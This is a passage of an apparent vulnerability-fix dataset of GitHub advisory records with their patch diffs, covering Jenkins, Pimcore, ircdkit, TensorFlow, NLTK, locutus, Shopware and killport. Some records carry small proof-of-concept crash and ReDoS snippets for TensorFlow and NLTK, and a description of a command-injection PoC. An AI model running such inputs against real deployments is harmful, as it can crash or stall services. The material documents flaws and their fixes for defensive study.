Jenkins.","published_date":"2022-05-14","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/ea981a029cb985b71f3a0dc0f9ce3b3e3e6c001b","commit_sha":"ea981a029cb985b71f3a0dc0f9ce3b3e3e6c001b","patch":"SINGLE","chain_ord":"['ea981a029cb985b71f3a0dc0f9ce3b3e3e6c001b']","before_first_fix_commit":"{'fe77d1c3dbf91ddf2a9f8e5ed882611455ab00d0'}","last_fix_commit":"ea981a029cb985b71f3a0dc0f9ce3b3e3e6c001b","chain_ord_pos":1.0,"commit_datetime":"09\/29\/2017, 13:41:00","message":"[SECURITY-490] Patch Commons File Upload 1.3.x.","author":"Jesse Glick","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'core\/pom.xml': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/ea981a029cb985b71f3a0dc0f9ce3b3e3e6c001b\/core%2Fpom.xml', 'patch': '@@ -588,7 +588,7 @@ THE SOFTWARE.\\n     <dependency>\\n       <groupId>commons-fileupload<\/groupId>\\n       <artifactId>commons-fileupload<\/artifactId>\\n-      <version>1.3.1-jenkins-1<\/version>\\n+      <version>1.3.1-jenkins-2<\/version> \\n     <\/dependency>\\n \\n     <!-- offline profiler API to put in the classpath if we need it -->'}}","message_norm":"[security-490] patch commons file upload 1.3.x.","language":"en","entities":"[('security-490', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/pom.xml'])","num_files":1.0},{"index":1686,"vuln_id":"GHSA-f7q6-xxph-mfm8","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/3ae96b9d41c117aafa45873ad10077d4b873a3cb'}","dataset":"osv","summary":"Cross-site Scripting in Pimcore Pimcore prior to version 10.2.10 contains a cross-site scripting vulnerability.","published_date":"2022-01-27","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/3ae96b9d41c117aafa45873ad10077d4b873a3cb","commit_sha":"3ae96b9d41c117aafa45873ad10077d4b873a3cb","patch":"SINGLE","chain_ord":"['3ae96b9d41c117aafa45873ad10077d4b873a3cb']","before_first_fix_commit":"{'fbb2badbb05ec80e4f6f15b52fb2f58cbbf379c4'}","last_fix_commit":"3ae96b9d41c117aafa45873ad10077d4b873a3cb","chain_ord_pos":1.0,"commit_datetime":"01\/25\/2022, 11:20:25","message":"disallow html entity names on import - follow up to #11217","author":"Divesh","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'models\/DataObject\/ClassDefinition\/Service.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/3ae96b9d41c117aafa45873ad10077d4b873a3cb\/models%2FDataObject%2FClassDefinition%2FService.php', 'patch': \"@@ -315,11 +315,11 @@ public static function generateLayoutTreeFromArray($array, $throwException = fal\\n     {\\n         if (is_array($array) && count($array) > 0) {\\n             if ($name = $array['name'] ?? false) {\\n-                $sanitizedName = htmlentities($name);\\n-                if ($sanitizedName !== $name) {\\n+                if (preg_match('\/<.+?>\/', $name)) {\\n                     throw new \\\\Exception('not a valid name:' . htmlentities($name));\\n                 }\\n             }\\n+\\n             \/** @var LoaderInterface $loader *\/\\n             $loader = \\\\Pimcore::getContainer()->get('pimcore.implementation_loader.object.' . $array['datatype']);\"}}","message_norm":"disallow html entity names on import - follow up to #11217","language":"en","entities":"[('#11217', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['models\/DataObject\/ClassDefinition\/Service.php'])","num_files":1.0},{"index":1687,"vuln_id":"GHSA-f7r3-p866-q9qr","cwe_id":"{'CWE-400'}","score":3.7,"chain":"{'https:\/\/github.com\/Twipped\/ircdkit\/pull\/2\/commits\/595ed02cde517fad57854d2ac2855a09a626e665', 'https:\/\/github.com\/Twipped\/ircdkit\/commit\/f0cc6dc913ec17b499fa33a676bb72c624456f2c'}","dataset":"osv","summary":"ircdkit vulnerable to Denial of Service due to unhandled connection end event Versions of `ircdkit` 1.0.3 and prior are vulnerable to a remote denial of service.\n\n\n## Recommendation\n\nUpgrade to version 1.0.4.","published_date":"2019-06-03","chain_len":2,"project":"https:\/\/github.com\/Twipped\/ircdkit","commit_href":"https:\/\/github.com\/Twipped\/ircdkit\/pull\/2\/commits\/595ed02cde517fad57854d2ac2855a09a626e665","commit_sha":"595ed02cde517fad57854d2ac2855a09a626e665","patch":"MULTI","chain_ord":"['f0cc6dc913ec17b499fa33a676bb72c624456f2c', '595ed02cde517fad57854d2ac2855a09a626e665']","before_first_fix_commit":"{'74aa751e75a90af34ef63377fcbd41285d155380'}","last_fix_commit":"595ed02cde517fad57854d2ac2855a09a626e665","chain_ord_pos":2.0,"commit_datetime":"05\/30\/2019, 03:10:50","message":"Update index.js\n\ncorrected unhandled connection 'end' event, fixes issue #1","author":"Trinity Fox","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Twipped\/ircdkit\/raw\/595ed02cde517fad57854d2ac2855a09a626e665\/lib%2Findex.js', 'patch': \"@@ -47,7 +47,7 @@ function create (options) {\\n \\n \\t\\tclient.on('end', function () {\\n \\t\\t\\tdebug('connection ended');\\n-\\t\\t\\tremoveClient(client);\\n+\\t\\t\\tclient.close();\\n \\t\\t\\tapp.emit('connection:end', client);\\n \\t\\t});\"}}","message_norm":"update index.js\n\ncorrected unhandled connection 'end' event, fixes issue #1","language":"en","entities":"[('update', 'ACTION', ''), ('#1', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/index.js'])","num_files":1.0},{"index":1688,"vuln_id":"GHSA-f7r3-p866-q9qr","cwe_id":"{'CWE-400'}","score":3.7,"chain":"{'https:\/\/github.com\/Twipped\/ircdkit\/pull\/2\/commits\/595ed02cde517fad57854d2ac2855a09a626e665', 'https:\/\/github.com\/Twipped\/ircdkit\/commit\/f0cc6dc913ec17b499fa33a676bb72c624456f2c'}","dataset":"osv","summary":"ircdkit vulnerable to Denial of Service due to unhandled connection end event Versions of `ircdkit` 1.0.3 and prior are vulnerable to a remote denial of service.\n\n\n## Recommendation\n\nUpgrade to version 1.0.4.","published_date":"2019-06-03","chain_len":2,"project":"https:\/\/github.com\/Twipped\/ircdkit","commit_href":"https:\/\/github.com\/Twipped\/ircdkit\/commit\/f0cc6dc913ec17b499fa33a676bb72c624456f2c","commit_sha":"f0cc6dc913ec17b499fa33a676bb72c624456f2c","patch":"MULTI","chain_ord":"['f0cc6dc913ec17b499fa33a676bb72c624456f2c', '595ed02cde517fad57854d2ac2855a09a626e665']","before_first_fix_commit":"{'74aa751e75a90af34ef63377fcbd41285d155380'}","last_fix_commit":"595ed02cde517fad57854d2ac2855a09a626e665","chain_ord_pos":1.0,"commit_datetime":"05\/30\/2019, 03:09:45","message":"DOS fix\n\ncorrected unhandled connection 'end' event, fixes issue #1","author":"Trinity Fox","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/index.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Twipped\/ircdkit\/raw\/f0cc6dc913ec17b499fa33a676bb72c624456f2c\/lib%2Findex.js', 'patch': \"@@ -47,7 +47,7 @@ function create (options) {\\n \\n \\t\\tclient.on('end', function () {\\n \\t\\t\\tdebug('connection ended');\\n-\\t\\t\\tremoveClient(client);\\n+\\t\\t\\tclient.close();\\n \\t\\t\\tapp.emit('connection:end', client);\\n \\t\\t});\"}}","message_norm":"dos fix\n\ncorrected unhandled connection 'end' event, fixes issue #1","language":"en","entities":"[('dos', 'SECWORD', ''), ('fix', 'ACTION', ''), ('#1', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/index.js'])","num_files":1.0},{"index":1697,"vuln_id":"GHSA-f8h4-7rgh-q2gm","cwe_id":"{'CWE-787', 'CWE-120'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e0b6e58c328059829c3eb968136f17aa72b6c876'}","dataset":"osv","summary":"Segfault and heap buffer overflow in `{Experimental,}DatasetToTFRecord` ### Impact\nThe implementation for `tf.raw_ops.ExperimentalDatasetToTFRecord` and `tf.raw_ops.DatasetToTFRecord` can trigger heap buffer overflow and segmentation fault:\n\n```python\nimport tensorflow as tf\n\ndataset = tf.data.Dataset.range(3)\ndataset = tf.data.experimental.to_variant(dataset)\ntf.raw_ops.ExperimentalDatasetToTFRecord(\n  input_dataset=dataset,\n  filename='\/tmp\/output',\n  compression_type='')\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f24faa153ad31a4b51578f8181d3aaab77a1ddeb\/tensorflow\/core\/kernels\/data\/experimental\/to_tf_record_op.cc#L93-L102) assumes that all records in the dataset are of string type. However, there is no check for that, and the example given above uses numeric types.\n\n### Patches\nWe have patched the issue in GitHub commit [e0b6e58c328059829c3eb968136f17aa72b6c876](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e0b6e58c328059829c3eb968136f17aa72b6c876).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e0b6e58c328059829c3eb968136f17aa72b6c876","commit_sha":"e0b6e58c328059829c3eb968136f17aa72b6c876","patch":"SINGLE","chain_ord":"['e0b6e58c328059829c3eb968136f17aa72b6c876']","before_first_fix_commit":"{'b5b9ae94a68215d4498ea2b3d1072dc4b2bf5600'}","last_fix_commit":"e0b6e58c328059829c3eb968136f17aa72b6c876","chain_ord_pos":1.0,"commit_datetime":"07\/29\/2021, 21:58:43","message":"Fix segfault\/heap buffer overflow in `{Experimental,}DatasetToTFRecord` where dataset is numeric.\n\nCode assumes only strings inputs and then interprets numbers as valid `tstring`s. Then, when trying to compute the CRC of the record this results in heap buffer overflow.\n\nPiperOrigin-RevId: 387675909\nChange-Id: I7396b9b8afc1ac744112af7c0b1cd7bb41e0f556","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 14, 'deletions': 1, 'total': 15}","files":"{'tensorflow\/core\/kernels\/data\/experimental\/to_tf_record_op.cc': {'additions': 14, 'deletions': 1, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e0b6e58c328059829c3eb968136f17aa72b6c876\/tensorflow%2Fcore%2Fkernels%2Fdata%2Fexperimental%2Fto_tf_record_op.cc', 'patch': '@@ -18,6 +18,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/function_handle_cache.h\"\\n #include \"tensorflow\/core\/framework\/op_kernel.h\"\\n #include \"tensorflow\/core\/framework\/resource_mgr.h\"\\n+#include \"tensorflow\/core\/framework\/types.h\"\\n #include \"tensorflow\/core\/kernels\/ops_util.h\"\\n #include \"tensorflow\/core\/lib\/core\/threadpool.h\"\\n #include \"tensorflow\/core\/lib\/io\/record_writer.h\"\\n@@ -91,8 +92,20 @@ class ToTFRecordOp : public AsyncOpKernel {\\n     TF_RETURN_IF_ERROR(finalized_dataset->MakeIterator(\\n         &iter_ctx, \/*parent=*\/nullptr, \"ToTFRecordOpIterator\", &iterator));\\n \\n+    const int num_output_dtypes = finalized_dataset->output_dtypes().size();\\n+    if (num_output_dtypes != 1) {\\n+      return errors::InvalidArgument(\\n+          \"ToTFRecordOp currently only support datasets of 1 single column, \",\\n+          \"but got \", num_output_dtypes);\\n+    }\\n+    const DataType dt = finalized_dataset->output_dtypes()[0];\\n+    if (dt != DT_STRING) {\\n+      return errors::InvalidArgument(\\n+          \"ToTFRecordOp currently only supports DT_STRING dataypes, but got \",\\n+          DataTypeString(dt));\\n+    }\\n     std::vector<Tensor> components;\\n-    components.reserve(finalized_dataset->output_dtypes().size());\\n+    components.reserve(num_output_dtypes);\\n     bool end_of_sequence;\\n     do {\\n       TF_RETURN_IF_ERROR('}}","message_norm":"fix segfault\/heap buffer overflow in `{experimental,}datasettotfrecord` where dataset is numeric.\n\ncode assumes only strings inputs and then interprets numbers as valid `tstring`s. then, when trying to compute the crc of the record this results in heap buffer overflow.\n\npiperorigin-revid: 387675909\nchange-id: i7396b9b8afc1ac744112af7c0b1cd7bb41e0f556","language":"en","entities":"[('fix', 'ACTION', ''), ('segfault', 'SECWORD', ''), ('buffer overflow', 'SECWORD', ''), ('crc', 'SECWORD', ''), ('buffer overflow', 'SECWORD', ''), ('387675909', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/data\/experimental\/to_tf_record_op.cc'])","num_files":1.0},{"index":1698,"vuln_id":"GHSA-f8m6-h2c7-8h9x","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/nltk\/nltk\/commit\/1405aad979c6b8080dbbc8e0858f89b2e3690341'}","dataset":"osv","summary":"Inefficient Regular Expression Complexity in nltk (word_tokenize, sent_tokenize) ### Impact\nThe vulnerability is present in [`PunktSentenceTokenizer`](https:\/\/www.nltk.org\/api\/nltk.tokenize.punkt.html#nltk.tokenize.punkt.PunktSentenceTokenizer), [`sent_tokenize`](https:\/\/www.nltk.org\/api\/nltk.tokenize.html#nltk.tokenize.sent_tokenize)  and [`word_tokenize`](https:\/\/www.nltk.org\/api\/nltk.tokenize.html#nltk.tokenize.word_tokenize). Any users of this class, or these two functions, are vulnerable to a Regular Expression Denial of Service (ReDoS) attack. \nIn short, a specifically crafted long input to any of these vulnerable functions will cause them to take a significant amount of execution time. The effect of this vulnerability is noticeable with the following example:\n```python\nfrom nltk.tokenize import word_tokenize\n\nn = 8\nfor length in [10**i for i in range(2, n)]:\n    # Prepare a malicious input\n    text = \"a\" * length\n    start_t = time.time()\n    # Call `word_tokenize` and naively measure the execution time\n    word_tokenize(text)\n    print(f\"A length of {length:<{n}} takes {time.time() - start_t:.4f}s\")\n```\nWhich gave the following output during testing:\n```python\nA length of 100      takes 0.0060s\nA length of 1000     takes 0.0060s\nA length of 10000    takes 0.6320s\nA length of 100000   takes 56.3322s\n...\n```\nI canceled the execution of the program after running it for several hours.\n\nIf your program relies on any of the vulnerable functions for tokenizing unpredictable user input, then we would strongly recommend upgrading to a version of NLTK without the vulnerability, or applying the workaround described below.\n\n### Patches\nThe problem has been patched in NLTK 3.6.6. After the fix, running the above program gives the following result:\n```python\nA length of 100      takes 0.0070s\nA length of 1000     takes 0.0010s\nA length of 10000    takes 0.0060s\nA length of 100000   takes 0.0400s\nA length of 1000000  takes 0.3520s\nA length of 10000000 takes 3.4641s\n```\nThis output shows a linear relationship in execution time versus input length, which is desirable for regular expressions.\nWe recommend updating to NLTK 3.6.6+ if possible.\n\n### Workarounds\nThe execution time of the vulnerable functions is exponential to the length of a malicious input. With other words, the execution time can be bounded by limiting the maximum length of an input to any of the vulnerable functions. Our recommendation is to implement such a limit.\n\n### References\n* The issue showcasing the vulnerability: https:\/\/github.com\/nltk\/nltk\/issues\/2866\n* The pull request containing considerably more information on the vulnerability, and the fix: https:\/\/github.com\/nltk\/nltk\/pull\/2869\n* The commit containing the fix: 1405aad979c6b8080dbbc8e0858f89b2e3690341\n* Information on CWE-1333: Inefficient Regular Expression Complexity: https:\/\/cwe.mitre.org\/data\/definitions\/1333.html\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com\/nltk\/nltk](https:\/\/github.com\/nltk\/nltk)\n* Email us at [nltk.team@gmail.com](mailto:nltk.team@gmail.com)","published_date":"2022-01-06","chain_len":1,"project":"https:\/\/github.com\/nltk\/nltk","commit_href":"https:\/\/github.com\/nltk\/nltk\/commit\/1405aad979c6b8080dbbc8e0858f89b2e3690341","commit_sha":"1405aad979c6b8080dbbc8e0858f89b2e3690341","patch":"SINGLE","chain_ord":"['1405aad979c6b8080dbbc8e0858f89b2e3690341']","before_first_fix_commit":"{'0b7b076247ec41f9b6b8a94400d48ea299e4b507'}","last_fix_commit":"1405aad979c6b8080dbbc8e0858f89b2e3690341","chain_ord_pos":1.0,"commit_datetime":"11\/26\/2021, 11:58:19","message":"Resolved serious ReDoS in PunktSentenceTokenizer (#2869)\n\n* Resolved serious ReDOS in PunktSentenceTokenizer\r\n\r\n* Improve performance by relying on string split instead of re.search\r\n\r\n* Solved issue if sentence contains just one token","author":"Tom Aarsen","comments":null,"stats":"{'additions': 61, 'deletions': 5, 'total': 66}","files":"{'nltk\/tokenize\/punkt.py': {'additions': 61, 'deletions': 5, 'changes': 66, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nltk\/nltk\/raw\/1405aad979c6b8080dbbc8e0858f89b2e3690341\/nltk%2Ftokenize%2Fpunkt.py', 'patch': '@@ -266,7 +266,6 @@ def word_tokenize(self, s):\\n         return self._word_tokenizer_re().findall(s)\\n \\n     _period_context_fmt = r\"\"\"\\n-        \\\\S*                          # some word material\\n         %(SentEndChars)s             # a potential sentence ending\\n         (?=(?P<after_tok>\\n             %(NonWord)s              # either other punctuation\\n@@ -1284,8 +1283,7 @@ def debug_decisions(self, text):\\n         See format_debug_decision() to help make this output readable.\\n         \"\"\"\\n \\n-        for match in self._lang_vars.period_context_re().finditer(text):\\n-            decision_text = match.group() + match.group(\"after_tok\")\\n+        for match, decision_text in self._match_potential_end_contexts(text):\\n             tokens = self._tokenize_words(decision_text)\\n             tokens = list(self._annotate_first_pass(tokens))\\n             while tokens and not tokens[0].tok.endswith(self._lang_vars.sent_end_chars):\\n@@ -1333,10 +1331,68 @@ def sentences_from_text(self, text, realign_boundaries=True):\\n         \"\"\"\\n         return [text[s:e] for s, e in self.span_tokenize(text, realign_boundaries)]\\n \\n+    def _match_potential_end_contexts(self, text):\\n+        \"\"\"\\n+        Given a text, find the matches of potential sentence breaks,\\n+        alongside the contexts surrounding these sentence breaks.\\n+\\n+        Since the fix for the ReDOS discovered in issue #2866, we no longer match\\n+        the word before a potential end of sentence token. Instead, we use a separate\\n+        regex for this. As a consequence, `finditer`\\'s desire to find non-overlapping\\n+        matches no longer aids us in finding the single longest match.\\n+        Where previously, we could use::\\n+\\n+            >>> pst = PunktSentenceTokenizer()\\n+            >>> text = \"Very bad acting!!! I promise.\"\\n+            >>> list(pst._lang_vars.period_context_re().finditer(text)) # doctest: +SKIP\\n+            [<re.Match object; span=(9, 18), match=\\'acting!!!\\'>]\\n+\\n+        Now we have to find the word before (i.e. \\'acting\\') separately, and `finditer`\\n+        returns::\\n+\\n+            >>> pst = PunktSentenceTokenizer()\\n+            >>> text = \"Very bad acting!!! I promise.\"\\n+            >>> list(pst._lang_vars.period_context_re().finditer(text)) # doctest: +NORMALIZE_WHITESPACE\\n+            [<re.Match object; span=(15, 16), match=\\'!\\'>,\\n+            <re.Match object; span=(16, 17), match=\\'!\\'>,\\n+            <re.Match object; span=(17, 18), match=\\'!\\'>]\\n+\\n+        So, we need to find the word before the match from right to left, and then manually remove\\n+        the overlaps. That is what this method does::\\n+\\n+            >>> pst = PunktSentenceTokenizer()\\n+            >>> text = \"Very bad acting!!! I promise.\"\\n+            >>> pst._match_potential_end_contexts(text)\\n+            [(<re.Match object; span=(17, 18), match=\\'!\\'>, \\'acting!!! I\\')]\\n+\\n+        :param text: String of one or more sentences\\n+        :type text: str\\n+        :return: List of match-context tuples.\\n+        :rtype: List[Tuple[re.Match, str]]\\n+        \"\"\"\\n+        before_words = {}\\n+        matches = []\\n+        for match in reversed(list(self._lang_vars.period_context_re().finditer(text))):\\n+            # Ignore matches that have already been captured by matches to the right of this match\\n+            if matches and match.end() > before_start:\\n+                continue\\n+            # Find the word before the current match\\n+            split = text[: match.start()].rsplit(maxsplit=1)\\n+            before_start = len(split[0]) if len(split) == 2 else 0\\n+            before_words[match] = split[-1]\\n+            matches.append(match)\\n+\\n+        return [\\n+            (\\n+                match,\\n+                before_words[match] + match.group() + match.group(\"after_tok\"),\\n+            )\\n+            for match in matches[::-1]\\n+        ]\\n+\\n     def _slices_from_text(self, text):\\n         last_break = 0\\n-        for match in self._lang_vars.period_context_re().finditer(text):\\n-            context = match.group() + match.group(\"after_tok\")\\n+        for match, context in self._match_potential_end_contexts(text):\\n             if self.text_contains_sentbreak(context):\\n                 yield slice(last_break, match.end())\\n                 if match.group(\"next_tok\"):'}}","message_norm":"resolved serious redos in punktsentencetokenizer (#2869)\n\n* resolved serious redos in punktsentencetokenizer\r\n\r\n* improve performance by relying on string split instead of re.search\r\n\r\n* solved issue if sentence contains just one token","language":"en","entities":"[('redos', 'SECWORD', ''), ('#2869', 'ISSUE', ''), ('redos', 'SECWORD', ''), ('improve', 'ACTION', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['nltk\/tokenize\/punkt.py'])","num_files":1.0},{"index":1706,"vuln_id":"GHSA-f98m-q3hr-p5wq","cwe_id":"{'CWE-915', 'CWE-20'}","score":9.8,"chain":"{'https:\/\/github.com\/locutusjs\/locutus\/commit\/0eb16d8541838e80f3c2340a9ef93ded7c97290f'}","dataset":"osv","summary":"Prototype Pollution in locutus All versions of package locutus prior to version 2.0.12 are vulnerable to Prototype Pollution via the php.strings.parse_str function.","published_date":"2021-05-06","chain_len":1,"project":"https:\/\/github.com\/locutusjs\/locutus","commit_href":"https:\/\/github.com\/locutusjs\/locutus\/commit\/0eb16d8541838e80f3c2340a9ef93ded7c97290f","commit_sha":"0eb16d8541838e80f3c2340a9ef93ded7c97290f","patch":"SINGLE","chain_ord":"['0eb16d8541838e80f3c2340a9ef93ded7c97290f']","before_first_fix_commit":"{'3f14dc5d142f5dcbdf36b4271c21a850a4a259da'}","last_fix_commit":"0eb16d8541838e80f3c2340a9ef93ded7c97290f","chain_ord_pos":1.0,"commit_datetime":"08\/25\/2020, 14:48:03","message":"fixed prototype pollution","author":"Asjid Kalam","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'src\/php\/strings\/parse_str.js': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/locutusjs\/locutus\/raw\/0eb16d8541838e80f3c2340a9ef93ded7c97290f\/src%2Fphp%2Fstrings%2Fparse_str.js', 'patch': \"@@ -74,6 +74,10 @@ module.exports = function parse_str (str, array) { \/\/ eslint-disable-line camelc\\n     key = _fixStr(tmp[0])\\n     value = (tmp.length < 2) ? '' : _fixStr(tmp[1])\\n \\n+    if (key.includes('__proto__') || key.includes('constructor') || key.includes('prototype')) {\\n+      break;\\n+    }\\n+\\n     while (key.charAt(0) === ' ') {\\n       key = key.slice(1)\\n     }\"}}","message_norm":"fixed prototype pollution","language":"en","entities":"[('fixed', 'ACTION', ''), ('prototype pollution', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/php\/strings\/parse_str.js'])","num_files":1.0},{"index":1713,"vuln_id":"GHSA-fc38-mxwr-pfhx","cwe_id":"{'CWE-79'}","score":8.0,"chain":"{'https:\/\/github.com\/shopware\/platform\/commit\/abe9f69e1f667800f974acccd3047b4930e4b423'}","dataset":"osv","summary":"Cross-Site Scripting via SVG media files ### Impact\nCross-Site Scripting via SVG media files\n\n### Patches\nWe recommend updating to the current version 6.4.3.1. You can get the update to 6.4.3.1 regularly via the Auto-Updater or directly via the download overview.\n\nhttps:\/\/www.shopware.com\/en\/download\/#shopware-6\n\n### Workarounds\nFor older versions of 6.1, 6.2, and 6.3, corresponding security measures are also available via a plugin. For the full range of functions, we recommend updating to the latest Shopware version.","published_date":"2021-08-23","chain_len":1,"project":"https:\/\/github.com\/shopware\/platform","commit_href":"https:\/\/github.com\/shopware\/platform\/commit\/abe9f69e1f667800f974acccd3047b4930e4b423","commit_sha":"abe9f69e1f667800f974acccd3047b4930e4b423","patch":"SINGLE","chain_ord":"['abe9f69e1f667800f974acccd3047b4930e4b423']","before_first_fix_commit":"{'912b96de3b839c6c5525c98cbb58f537c2d838be'}","last_fix_commit":"abe9f69e1f667800f974acccd3047b4930e4b423","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 13:31:10","message":"NEXT-15677 - Fix XSS for SVG files","author":"Jonas Elfering","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'public\/.htaccess.dist': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/shopware\/platform\/raw\/abe9f69e1f667800f974acccd3047b4930e4b423\/public%2F.htaccess.dist', 'patch': '@@ -36,7 +36,7 @@ DirectoryIndex index.php\\n <\/IfModule>\\n \\n <IfModule mod_headers.c>\\n-    <FilesMatch \"\\\\.svg$\">\\n+    <FilesMatch \"\\\\.(?i:svg)$\">\\n         Header set Content-Security-Policy \"script-src \\'none\\'\"\\n     <\/FilesMatch>\\n <\/IfModule>'}}","message_norm":"next-15677 - fix xss for svg files","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['public\/.htaccess.dist'])","num_files":1.0},{"index":1714,"vuln_id":"GHSA-fc42-h7q4-qp8h","cwe_id":"{'CWE-77'}","score":7.5,"chain":"{'https:\/\/github.com\/ssnau\/killport\/commit\/bec8e371f170a12e11cd222ffc7a6e1ae9942638'}","dataset":"osv","summary":"Command Injection in killport This affects the package killport before 1.0.2. If (attacker-controlled) user input is given, it is possible for an attacker to execute arbitrary commands. This is due to use of the child_process exec function without input sanitization. Running this PoC will cause the command touch success to be executed, leading to the creation of a file called success.","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/ssnau\/killport","commit_href":"https:\/\/github.com\/ssnau\/killport\/commit\/bec8e371f170a12e11cd222ffc7a6e1ae9942638","commit_sha":"bec8e371f170a12e11cd222ffc7a6e1ae9942638","patch":"SINGLE","chain_ord":"['bec8e371f170a12e11cd222ffc7a6e1ae9942638']","before_first_fix_commit":"{'5268f23ea8f152e47182b263d8f7ef20c12a9f28'}","last_fix_commit":"bec8e371f170a12e11cd222ffc7a6e1ae9942638","chain_ord_pos":1.0,"commit_datetime":"03\/17\/2021, 17:26:35","message":"fix a vulnerability issue if a provided port is not a number","author":"ssnau","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'index.js': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ssnau\/killport\/raw\/bec8e371f170a12e11cd222ffc7a6e1ae9942638\/index.js', 'patch': \"@@ -5,6 +5,7 @@ var notEmpty = function(x) {return x};\\n \\n module.exports = function killport(port) {\\n   return (new Promise(function(resolve, reject) {\\n+    if (!\/^\\\\d+$\/.test(port)) throw new Error('port must be a number.');\\n     var cmd = 'lsof -i:' + port; \\n     cp.exec(cmd, function(err, stdout, stderr){\\n       \/\/ do not check `err`, if no process found\"}}","message_norm":"fix a vulnerability issue if a provided port is not a number","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('issue', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1718,"vuln_id":"GHSA-fcwc-p4fc-c5cc","cwe_id":"{'CWE-476'}","score":7.7,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/482da92095c4d48f8784b1f00dda4f81c28d2988'}","dataset":"osv","summary":"Null pointer dereference in `MatrixDiagPartOp` ### Impact\nIf a user does not provide a valid padding value to `tf.raw_ops.MatrixDiagPartOp`, then the code triggers a null pointer dereference (if input is empty) or produces invalid behavior, ignoring all values after the first:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixDiagPartV2(\n  input=tf.ones(2,dtype=tf.int32),\n  k=tf.ones(2,dtype=tf.int32),\n  padding_value=[])\n```\n\nAlthough this example is given for `MatrixDiagPartV2`, all versions of the operation are affected.\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc#L89) reads the first value from a tensor buffer without first checking that the tensor has values to read from.\n\n### Patches\nWe have patched the issue in GitHub commit [482da92095c4d48f8784b1f00dda4f81c28d2988](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/482da92095c4d48f8784b1f00dda4f81c28d2988).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 